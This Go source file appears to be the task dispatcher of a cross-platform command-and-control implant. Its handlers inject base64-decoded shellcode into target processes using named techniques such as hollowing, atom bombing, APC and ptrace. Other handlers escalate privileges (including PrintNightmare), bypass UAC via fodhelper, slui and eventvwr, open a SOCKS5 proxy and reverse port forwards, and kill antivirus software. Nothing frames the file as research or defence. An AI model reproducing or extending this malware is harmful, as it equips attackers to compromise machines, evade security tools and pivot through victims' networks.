//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"fmt"
	"runtime"
	"strconv"
	"strings"
)

func handleInject(task Task, res *TaskResult) {
	parts := strings.Split(task.Command, "|")
	if len(parts) < 2 {
		res.Error = "format: pid|technique"
		return
	}
	pid, _ := strconv.Atoi(parts[0])
	tech := parts[1]
	shellcode, _ := base64.StdEncoding.DecodeString(task.Data)
	err := injectProcess(uint32(pid), shellcode, tech)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = "inject success"
	}
}

func handleInjectMethods(task Task, res *TaskResult) {
	if runtime.GOOS == "windows" {
		res.Output = `Available injection methods (Windows):
  createremotethread (crt, remote) - CreateRemoteThread (kernel32)
  ntcreatethreadex (ntct, nt) - NtCreateThreadEx (direct syscall)
  ntcreatethreadex_indirect (ntcti, nti) - NtCreateThreadEx (indirect syscall)
  apc (queueapc) - QueueUserAPC to existing thread
  earlybird - CreateProcess suspended + APC + ResumeThread
  threadless (tl) - SetThreadContext RIP overwrite (no new thread)
  syscall (hellsgate, direct) - Hell's Gate direct syscall + CreateRemoteThread
  indirect - Indirect syscall through ntdll gadget + NtCreateThreadEx
  hollow - Process hollowing (suspend + unmap + write + resume)
  hijack - Thread hijacking (suspend + set RIP + resume)
  atom - Atom bombing (section + global atom + APC)
  txf - Transacted hollowing (TxF file + CreateProcess)
  stomp - Module stomping (overwrite module code + remote thread)`
	} else if runtime.GOOS == "linux" {
		res.Output = `Available injection methods (Linux):
  ptrace (ptrace_pokedata) - Ptrace POKEDATA injection into remote process
  mem (proc_mem) - Write to /proc/pid/mem for process injection
  process_vm_writev (vm_writev) - process_vm_writev syscall injection
  ld_preload - LD_PRELOAD-based injection into spawned process`
	} else if runtime.GOOS == "darwin" {
		res.Output = `Available injection methods (macOS):
  ptrace (pt_attachexc) - Ptrace-based injection (requires SIP disabled or entitlement)
  task_for_pid (mach_vm) - Mach VM injection (requires root/entitlement)`
	} else {
		res.Output = "No injection methods available for this platform"
	}
}

func handleSpawn(task Task, res *TaskResult) {
	parts := strings.SplitN(task.Command, "|", 3)
	targetExe := "rundll32.exe"
	technique := "CreateRemoteThread"
	if len(parts) > 0 && parts[0] != "" {
		targetExe = parts[0]
	}
	if len(parts) > 1 && parts[1] != "" {
		technique = parts[1]
	}
	var shellcode []byte
	if len(parts) > 2 && parts[2] != "" {
		var err error
		shellcode, err = base64.StdEncoding.DecodeString(parts[2])
		if err != nil {
			res.Error = "failed to decode shellcode: " + err.Error()
			return
		}
	}
	result := spawnProcess(targetExe, shellcode, technique)
	res.Output = result
}

func handleShinject(task Task, res *TaskResult) {
	parts := strings.SplitN(task.Command, "|", 2)
	if len(parts) < 1 {
		res.Error = "format: pid|technique"
		return
	}
	pid, _ := strconv.Atoi(parts[0])
	tech := "createremotethread"
	if len(parts) > 1 && parts[1] != "" {
		tech = parts[1]
	}
	shellcode, _ := base64.StdEncoding.DecodeString(task.Data)
	if len(shellcode) == 0 {
		res.Error = "empty shellcode in task.Data"
		return
	}
	// Platform-specific default tech
	if runtime.GOOS == "linux" && tech == "createremotethread" {
		tech = "ptrace"
	} else if runtime.GOOS == "darwin" && tech == "createremotethread" {
		tech = "ptrace"
	}
	err := injectProcess(uint32(pid), shellcode, tech)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = "shellcode injected"
	}
}

func handleShspawn(task Task, res *TaskResult) {
	targetExe := ""
	tech := ""
	if runtime.GOOS == "windows" {
		targetExe = "rundll32.exe"
		tech = "apc"
	} else if runtime.GOOS == "linux" {
		targetExe = "/bin/sleep"
		tech = "ptrace"
	} else if runtime.GOOS == "darwin" {
		targetExe = "/usr/bin/yes"
		tech = "ptrace"
	}
	if task.Command != "" {
		targetExe = task.Command
	}
	shellcode, _ := base64.StdEncoding.DecodeString(task.Data)
	if len(shellcode) == 0 {
		res.Error = "empty shellcode in task.Data"
		return
	}
	result := spawnProcess(targetExe, shellcode, tech)
	res.Output = result
}

func handleElevate(task Task, res *TaskResult) {
	out, err := elevate(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleElevatePrintNightmare(task Task, res *TaskResult) {
	out, err := elevatePrintNightmare(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleUACBypass(task Task, res *TaskResult) {
	parts := strings.SplitN(task.Command, "|", 2)
	method := parts[0]
	payload := ""
	if len(parts) > 1 {
		payload = parts[1]
	}
	res.Output = uacBypass(method, payload)
}

// UAC sub-methods used by elevate()
func handleFodhelper(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "Windows only"
		return
	}
	_ = tryUACBypass("fodhelper", task.Command)
	res.Output = "fodhelper triggered"
}

func handleSluiUAC(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "Windows only"
		return
	}
	_ = tryUACBypass("slui", task.Command)
	res.Output = "slui triggered"
}

func handleEventvwrUAC(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "Windows only"
		return
	}
	_ = tryUACBypass("eventvwr", task.Command)
	res.Output = "eventvwr triggered"
}

func handleComputerDefaultsUAC(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "Windows only"
		return
	}
	_ = tryUACBypass("computerdefaults", task.Command)
	res.Output = "computerdefaults triggered"
}

func handleSocks(task Task, res *TaskResult) {
	port := task.Command
	if port == "" {
		port = "1080"
	}
	go startSocksServer("0.0.0.0:" + port)
	res.Output = "SOCKS5 started on " + port
}

func handleRPortFwdStart(task Task, res *TaskResult) {
	parts := strings.SplitN(task.Command, "|", 2)
	if len(parts) < 2 {
		res.Error = "format: lport|forwardHost:forwardPort"
		return
	}
	lport, err := strconv.Atoi(strings.TrimSpace(parts[0]))
	if err != nil {
		res.Error = "invalid lport: " + parts[0]
		return
	}
	addr, err := startRPortForward(lport, strings.TrimSpace(parts[1]))
	if err != nil {
		res.Error = err.Error()
		return
	}
	res.Output = fmt.Sprintf("rportfwd listening on %s -> %s", addr, parts[1])
}

func handleRPortFwdStop(task Task, res *TaskResult) {
	lport, err := strconv.Atoi(strings.TrimSpace(task.Command))
	if err != nil {
		res.Error = "usage: rportfwd_stop <lport>"
		return
	}
	activeConns, err := stopRPortForward(lport)
	if err != nil {
		res.Error = err.Error()
		return
	}
	if activeConns > 0 {
		res.Output = fmt.Sprintf("rportfwd on :%d stopped (%d active bridge(s) closed)", lport, activeConns)
	} else {
		res.Output = fmt.Sprintf("rportfwd on :%d stopped", lport)
	}
}

func handleKillAV(task Task, res *TaskResult) {
	out, err := killAV()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}
